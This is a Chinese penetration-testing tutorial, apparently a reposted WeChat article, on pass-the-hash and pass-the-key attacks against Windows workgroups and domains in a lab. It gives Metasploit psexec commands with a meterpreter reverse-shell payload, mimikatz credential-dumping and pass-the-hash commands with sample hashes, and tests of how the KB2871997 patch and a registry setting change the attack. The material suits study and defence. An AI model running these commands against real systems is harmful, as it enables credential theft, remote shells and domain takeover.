> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490908&idx=1&sn=97594fbbef40346d07b5a6e5185ce77e&chksm=fc781981cb0f9097d18f4b32ff39f59b3512cedd35f0810ad5f61b661e631153f8c4e157d875&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/UZ1NGUYLEFgwuEp9SUZPx1nFQ8GW7lWHnnImWeVFF9wBDK21ecqM7sOIV7WVEKzkhHy3nsLFOIx8lkWp4BIQRQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490017&idx=1&sn=426336dfeeda818b0772b3c44703e173&chksm=fc781d3ccb0f942a7c07662752bb2f6983eb9c249c0d6b833f058b1d95fc7080d2d2598054ac&scene=21#wechat_redirect)

作者：谢公子

  

CSDN 安全博客专家，擅长渗透测试、Web 安全攻防、红蓝对抗。其自有公众号：谢公子学安全

免责声明：本公众号发布的文章均转载自互联网或经作者投稿授权的原创，文末已注明出处，其内容和图片版权归原网站或作者本人所有，并不代表安全 + 的观点，若有无意侵权或转载不当之处请联系我们处理，谢谢合作！

**欢迎各位添加微信号：qinchang_198231** 

**加入安全 + 交流群 和大佬们一起交流安全技术**

**哈希传递攻击**攻击****  

哈希传递攻击是基于 NTLM 认证的一种攻击方式。哈希传递攻击的利用前提是我们获得了某个用户的密码哈希值，但是解不开明文。这时我们可以利用 NTLM 认证的一种缺陷，利用用户的密码哈希值来进行 NTLM 认证。在域环境中，大量计算机在安装时会使用相同的本地管理员账号和密码。因此，如果计算机的本地管理员账号密码相同，攻击者就能使用哈希传递攻击登录内网中的其他机器。

**哈希传递攻击适用情况：**

**在工作组环境中：**

*   Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。
    
*   Windows Vista 之后的机器，只能是 administrator 用户的哈希值才能进行哈希传递攻击，其他用户 (包括管理员用户但是非 administrator) 也不能使用哈希传递攻击，会提示拒绝访问。
    

**在域环境中：**

*   只能是域管理员组内用户 (可以是域管理员组内非 administrator 用户) 的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。
    

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRuuNsibqqHiaN2j2K0NoyqVyU6xBibvO7nvt7pLLckgQImV16iaCeuKCWvA/640?wx_fmt=gif)

  

**MSF 进行哈希传递攻击 PtH(工作组)**

有些时候，当我们获取到了某台主机的 administrator 用户的密码哈希值 ，并且该主机的 445 端口打开着。我们则可以利用 exploit/windows/smb/psexec 模块用 MSF 进行远程登录 (哈希传递攻击)。这个是 rhost 可以是一个主机，也可以设置一个网段。

这里目标主机的 WindowsVista 之后的机器，所以只能使用 administrator 用户进行攻击。

**工作组环境，必须是 administrator 用户**

```
msf > use  exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set lhost 192.168.10.27
msf exploit(psexec) > set rhost 192.168.10.14
msf exploit(psexec) > set smbuser Administrator
msf exploit(psexec) > set smbpass 815A3D91F923441FAAD3B435B51404EE:A86D277D2BCD8C8184B01AC21B6985F6   #这里LM和NTLM我们已经获取到了
msf exploit(psexec) > exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXR346vWRBKKRHxQ80CDY8xic6bmLTl4qhiagIEmpeOteZ1Ccef87micv8Cg/640?wx_fmt=png)

  

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRuuNsibqqHiaN2j2K0NoyqVyU6xBibvO7nvt7pLLckgQImV16iaCeuKCWvA/640?wx_fmt=gif)

  

**MSF 进行哈希传递攻击 PtH(域)**

当我们获取到了域管理员组内用户的密码哈希值 ，并且该主机的 445 端口打开着。我们则可以利用 exploit/windows/smb/psexec 模块用 MSF 进行哈希传递攻击。

**域环境，域管理员组内用户即可**

```
msf > use  exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set lhost 192.168.10.11
msf exploit(psexec) > set rhost 192.168.10.131
msf exploit(psexec) > set smbuser test   #test用户在域管理员组内，注意这里不需要写域前缀
msf exploit(psexec) > set smbpass AADA8EDA23213C020B0C478392B5469F:51B7F7DCA9302C839E48D039EE37F0D1
msf exploit(psexec) > exploit
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXR1Sozd7ibicvo3fXSoNHM1HgcVf94ORicxXYXeP4iaibYxhUgGPw9RJU5GKw/640?wx_fmt=png)

  

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRuuNsibqqHiaN2j2K0NoyqVyU6xBibvO7nvt7pLLckgQImV16iaCeuKCWvA/640?wx_fmt=gif)

  

**mimikatz 进行哈希传递攻击 PtH(工作组)**

*   Windows Vista 之前的机器，可以使用本地管理员组内用户进行攻击。
    
*   Windows Vista 之后的机器，只能是 administrator 用户的哈希值才能进行哈希传递攻击，其他用户 (包括管理员用户但是非 administrator) 也不能使用哈希传递攻击，会提示拒绝访问。
    

```
privilege::debug    #先提权
#使用administrator用户的NTLM哈希值进行攻击
sekurlsa::pth /user:用户名  /domain:目标机器IP  /ntlm:密码哈希
```

**Windows Server 2003**

本地管理员：

*   administrator
    
*   xie
    

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRdbz0nWXtMjDic8ibLXvf45lbFY3dPrFNE0bgAolV8b4uPlR79GSHeFnw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRzn28tOhS2q9vAGRqgy8tpCTY6ydI1FTUuOrH4qFliagBu0hicl62rrsg/640?wx_fmt=png)

**Windows Server 2008** 

本地管理员：

*   administrator
    
*   xie
    

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRUFP3QeN4fC9dJ8icWTHhfuJnyJVdkJMQbDRL9W8iaVwaJfD0ZwLn02CQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRghHvAcQtNuZeEyqg2fYZdOEpU1VuC4dwhxv085ptnJuubORbgH8jNg/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRuuNsibqqHiaN2j2K0NoyqVyU6xBibvO7nvt7pLLckgQImV16iaCeuKCWvA/640?wx_fmt=gif)

  

**mimikatz 进行哈希传递攻击 PtH(域)**

在域环境中，当我们获得了 域管理员组内用户 的 NTLM 哈希值，我们可以使用域内的一台主机用 mimikatz 对域内任何一台机器 (包括域控) 进行哈希传递攻击。执行完命令后，会弹出 CMD 窗口，在弹出的 CMD 窗口我们可以访问域内任何一台机器。前提是我们必须拥有域内任意一台主机的本地管理员权限和域管理员的密码 NTLM 哈希值。

*   域：xie.com
    
*   域控：WIN2008.xie.com
    
*   普通域主机：WIN2003
    
*   域管理员：test
    
*   域普通用户：hack
    

```
privilege::debug    #先提权

#使用域管理员test的NTLM哈希值对域控进行哈希传递攻击,域用户test在域管理员组中
sekurlsa::pth  /user:test  /domain:xie.com  /ntlm:6542d35ed5ff6ae5e75b875068c5d3bc
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRlKcFBdEeVXoQ3jG3TibMicZDLSGsdc2lNw1kicS1qQW4plLbudAfr9BWg/640?wx_fmt=png)

  

在弹出的 cmd 窗口中，使用 wmiexec.vbs 进行验证

```
cscript wmiexec.vbs /shell Win2008
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXR0ico3uWHgG8vwiaDWESib3PXoSiaibQrznh3icw6ddI75UnXrX6aZ7lZMezA/640?wx_fmt=png)

  

只有域管理员的 NTLM 哈希值才可以进行哈希传递攻击，域普通用户的 NTLM 哈希值无法进行哈希传递攻击

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRrl5j60CiaIQgxQF31PML3ybdlE1T4ZCcPlbibdV5o23NH3CByZEuibNcg/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRuuNsibqqHiaN2j2K0NoyqVyU6xBibvO7nvt7pLLckgQImV16iaCeuKCWvA/640?wx_fmt=gif)

  

**使用 AES 进行 Key 传递攻击 (PTK,Pass The Key)**

前提：只适用于域环境，并且目标主机需要安装 KB2871997 补丁

**获取 AES 凭证**

```
privilege::debug
sekurlsa::ekeys          #获取kerberos加密凭证
```

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRpVMwf9Fdb5szwiaarL5TAO0zic9jl8dQjyjA15BTIW5w3UdOlBo4fYUg/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXR5It316ialcHLtFmEvVHLLgcO69wvCyN5SAhHg2GO6lRia6nhxdfialriaQ/640?wx_fmt=png)

**利用获得到的 AES256 或 AES128 进行 Key 攻击**

```
privilege::debug
#使用AES-256进行Key传递攻击
sekurlsa::pth /user:administrator /domain:xie.com /aes256:1a39fa07e4c96606b371fe12334848efc60d8b3c4253ce6e0cb1a454c7d42083
#使用AES-128进行Key传递攻击
sekurlsa::pth /user:administrator /domain:xie.com /aes128:4728551c859bbe351e9c11b5d959163e
```

域控未打 KB2871997 补丁前，无法使用 Key 传递攻击

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRAJbf192Iq76q4K917vQFbXfF8FRLMB0uwC6RKaRicMCUQxvpGxnnskQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRCia0AmsnibagWg9bAibtMFlUyKyRD1U1Ys1wJxjxk8HT7MT91K79WGVtA/640?wx_fmt=png)

但是当我在域控上打上 KB2871997 补丁后，Ke 传递攻击仍然无法使用！这里不知道为什么。

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXROjwCnUdWSoYz1pXcaHibc59fYIibxhsiary5P2nUphh6Ticcl4S663dlLw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXReyTRwiacZN24cSIxiaSCuKibkDgRoR5EQkEkbmKdgJqbgibCNOGibYiactzQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_gif/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRuuNsibqqHiaN2j2K0NoyqVyU6xBibvO7nvt7pLLckgQImV16iaCeuKCWvA/640?wx_fmt=gif)

  

**更新 KB2871997 补丁产生的影响**  

微软在 2014 年 5 月发布了 KB2871997 和 KB2928120 两个补丁。KB2871997 针对 PTH 攻击，而 KB2928120 针对 GPP(Group Policy Preference)。KB2871997 补丁将使本地帐号不再可以用于远程接入系统，不管是 Network logon 还是 Interactive login。其后果就是：无法通过本地管理员权限对远程计算机使用 Psexec、WMI、smbexec、IPC 等，也无法访问远程主机的文件共享等。

在实际测试中，更新 KB2871997 之后，发现无法使用常规的哈希传递方法进行横向移动，但 administrator(SID=500) 账号例外，使用该账号的散列值依然可以进行哈希传递攻击。这里需要强调的是 SID=500 的账号。即使将 administrator 账号改名，也不会影响 SID 的值。所以，如果攻击者使用 SID 为 500 的账号进行哈希传递攻击，就不会受到 KB2871997 的影响。

**实验**

*   Windows Server 2008R2：192.168.10.20
    
*   域管理员：administrator  、 xie  
    

未打 KB2871997 补丁前，使用 administrator 账号可以成功进行哈希传递攻击，使用管理员账号 xie 无法进行哈希传递攻击。

![](https://mmbiz.qpic.cn/mmbiz_jpg/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRQ5gLJiaDqnXTUUG935RibeacvnFg7ia9Y9g60aDGXFHwPvKX2kzPomzAw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXReReYXtlTGLVrDSibGB11D4avHz4RxNSWfAVoKfA1QK0kS7sS8IWQBXg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRb129kuj2I1fdTQwuIjic7g4leNYAN6eD0libibLQFHPiauNeNZpWtNawaA/640?wx_fmt=png)

打上 KB2871997 补丁后，使用 administrator 账号依然可以成功进行哈希传递攻击，使用管理员账号 xie 无法进行哈希传递攻击。

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRK4MjsRLAaV1rv87QWRZorXNOa7kD7jP3GMcLK7iaSYLukVGmUV5Hkzg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRbSO6xt5JDhcOsyG2CyA970aKb0S85HFYC1GGjM2IIvsZFxVuJ4yYSg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRcPU0zudpyl0Jax6F3MdMicDdfHsWxFaEypBy9KEoZLbrqbibFXZoyobA/640?wx_fmt=png)

将 administrator 账号重命名为 admin 账号后，由于不存在 administrator 账号了，所以无法使用 administrator 账号进行哈希传递攻击，但是可以使用  admin 账号紧进行哈希传递攻击，因为 admin 账号的 SID 值为 500。

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRLpia6mjXvoOFs1nk8XOHQiatLRvAQfsaLlop6OPnHfhtvc12OLxKPzRw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRBtScb2TY6TYTsm0yyfd35tRBnthib4z7uCbCLmKeIEgUUVWUo4HJibHA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXRlZeIVNMzrib25ibSDI6g8HrwNUWibHNofn57DNzBKtMGicpofBccKKyjKA/640?wx_fmt=png)

修改目标机器的 LocalAccountTokenFilterPolicy 为 1 后，使用普通域管理员账号 xie 也可进行哈希传递攻击。

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXR16GS688BCI4TQk8lbzHEfgTPzZib5zlSdia5HDarmmXJCBU3m56B7iaxg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFj38BDjibVZuvg5ky151DSXR4Yuu2FdPrZI9TPTzNls5helPazfPf2iaMEUfKevjjhhu2dRoF2HzOZw/640?wx_fmt=png)

**总结：**其实 KB2871997 的补丁并没有多大的用处，由于在 Windows Vista 时代，微软就通过将 LocalAccountTokenFilterPolicy 值默认设置为 0 来禁止非 administrator 账号的远程连接 (包括哈希传递攻击)，但是 administrator 用户不受影响。即使目标主机更新了 KB2871997 的补丁，仍然可以使用 PID=500 的用户进行哈希传递攻击，而 PID=500 的用户默认为 aministrator，所以仍然可以使用 administrator 用户进行哈希传递攻击。并且在打了 KB2871997 补丁的机器上，通过将 LocalAccountTokenFilterPolicy 设置为 1，也还是可以使用普通管理员账号进行哈希传递攻击。

[![](https://mmbiz.qpic.cn/mmbiz_jpg/UZ1NGUYLEFiaJeGjd04dibz7iah6JTVeLsicT9kVuXfNXdqGhfhvhCZicafopwTts4dZoF9icPAFJh9RQ9omsbplQLTA/640?wx_fmt=jpeg)](https://mp.weixin.qq.com/s?__biz=MjM5NDY1OTA1NQ==&mid=2650791647&idx=1&sn=400183ea5bea0a3156a2b3a016a0f4d7&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/UZ1NGUYLEFjGibCQezQKY4NzE1WGn6FBCbq3pQVl0oONnYXT354mlVw0edib6X6flYib9JRTic4DTibgib15WZC7sDUA/640?wx_fmt=png)

[技术干货 | 工具：Social engineering tookit 钓鱼网站](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490513&idx=2&sn=10afb29a20f37df05ebb12ea4d540e1f&chksm=fc781f0ccb0f961a85e646dd54e977dbcaeb5569be6701db4c29b9e204d964bab3ded6bf1999&scene=21#wechat_redirect)

[技术干货 | 工具的使用：CobaltStrike 上线 Linux 主机 (CrossC2)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490608&idx=1&sn=f2b2ea93b109447aa8cc2c872aa87c52&chksm=fc7818edcb0f91fbf85fa53f71e9967fc29fc93f6a783eed154707ca2dec24ca7f419fde5705&scene=21#wechat_redirect)

[内网渗透（十） | 票据传递攻击](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490376&idx=2&sn=c070dd4c761b49d3fabd573cc9c96b5a&chksm=fc781f95cb0f9683b0f6c64f5db5823973c1b10e87b1452192bbed6c1159eccf6e8f2fd0290b&scene=21#wechat_redirect)  

[内网渗透（九） | Windows 域的管理](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490197&idx=1&sn=4682065ddcab00b584918bc267e33f53&chksm=fc781e48cb0f975eddc44d77698fbb466d0eac7d745a6e5bbaf131560b3d4f9e22c1a359d241&scene=21#wechat_redirect)  

[内网渗透（八） | 内网转发工具的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490042&idx=1&sn=136d4057044a7d6f6cb5b57d20f7954a&chksm=fc781d27cb0f9431ec590662ab4e6bcd31b303e7caa20a2b116fd9a9b97e9e3be0bc34408490&scene=21#wechat_redirect)  

[内网渗透 | 域内用户枚举和密码喷洒攻击 (Password Spraying)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489985&idx=1&sn=0b7bce093e501b9817f263c24e0ed5b8&chksm=fc781d1ccb0f940aad0c9b2b06b68c7a58b0b4c513fe45f7da6e6438cac76d4778e61122faf8&scene=21#wechat_redirect)  

[内网渗透（七） | 内网转发及隐蔽隧道：网络层隧道技术之 ICMP 隧道 (pingTunnel/IcmpTunnel)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489736&idx=2&sn=0cb551ee520860878c2c33108033c00c&chksm=fc781c15cb0f9503f672aa0bd18cb13fef4c60124ba5978ab947c34272b2d8a28c584a99219d&scene=21#wechat_redirect)  

[内网渗透（六） | 工作组和域的区别](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489205&idx=1&sn=24f9a2e0e6b92a167f3082bb6e09c734&chksm=fc781268cb0f9b7e3c11d19a9fb41567124055eb0e8dd526cbbaf1e9393ff707f9fa9d10c32b&scene=21#wechat_redirect)  

[内网渗透（五） | AS-REP Roasting 攻击](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489128&idx=1&sn=dac676323e81307e18dd7f6c8998bde7&chksm=fc7812b5cb0f9ba3a63c447468b7e1bdf3250ed0a6217b07a22819c816a8da1fdf16c164fce2&scene=21#wechat_redirect)

[内网渗透 | 内网穿透工具 FRP 的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489057&idx=3&sn=f81ef113f1f136c2289c8bca24c5deb1&chksm=fc7812fccb0f9beaa65e5e9cf40cf9797d207627ae30cb8c7d42d8c12a2cb0765700860dab84&scene=21#wechat_redirect)  

[内网渗透（四） | 域渗透之 Kerberoast 攻击_Python](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488972&idx=1&sn=87a6d987de72a03a2710f162170cd3a0&chksm=fc781111cb0f98070f74377f8348c529699a5eea8497fd40d254cf37a1f54f96632da6a96d83&scene=21#wechat_redirect)  

[内网渗透（三） | 域渗透之 SPN 服务主体名称](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488936&idx=1&sn=82c127c8ad6d3e36f1a977e5ba122228&chksm=fc781175cb0f986392b4c78112dcd01bf5c71e7d6bdc292f0d8a556cc27e6bd8ebc54278165d&scene=21#wechat_redirect)  

[内网渗透（二） | MSF 和 CobaltStrike 联动](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488905&idx=2&sn=6e15c9c5dd126a607e7a90100b6148d6&chksm=fc781154cb0f98421e25a36ddbb222f3378edcda5d23f329a69a253a9240f1de502a00ee983b&scene=21#wechat_redirect)  

[内网渗透 | 域内认证之 Kerberos 协议详解](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488900&idx=3&sn=dc2689efec7757f7b432e1fb38b599d4&chksm=fc781159cb0f984f1a44668d9e77d373e4b3bfa25e5fcb1512251e699d17d2b0da55348a2210&scene=21#wechat_redirect)  

[内网渗透（一） | 搭建域环境](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488866&idx=2&sn=89f9ca5dec033f01e07d85352eec7387&chksm=fc7811bfcb0f98a9c2e5a73444678020b173364c402f770076580556a053f7a63af51acf3adc&scene=21#wechat_redirect)